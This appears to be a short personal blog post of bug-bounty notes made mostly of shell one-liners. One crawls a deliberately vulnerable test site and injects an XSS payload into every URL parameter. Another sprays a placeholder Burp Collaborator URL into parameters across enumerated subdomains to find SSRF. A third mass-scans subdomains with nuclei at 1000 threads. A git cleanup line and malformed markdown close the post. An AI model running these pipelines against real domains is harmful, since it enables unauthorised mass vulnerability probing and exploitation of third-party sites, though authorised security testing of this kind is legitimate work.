---
title: "HelloWorld"
date: 2023-07-23T16:51:27-07:00
draft: false
---

### Let's see how this works.

### Notes.

```
~%$: echo testphp.vulnweb.com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
```

### How about an ssrf one:
```
~%$: findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://YOUR.burpcollaborator.net
```

### ~~Scratch this.~~:
```
~%$: xargs -a domain -I@ -P500 sh -c 'shuffledns -d "@" -silent -w words.txt -r resolvers.txt' | httpx -silent -threads 1000 | nuclei -t /root/nuclei-templates/ -o re1

### random:
```git status | grep 'deleted:' | sed 's/deleted:    //' | xargs git rm```
```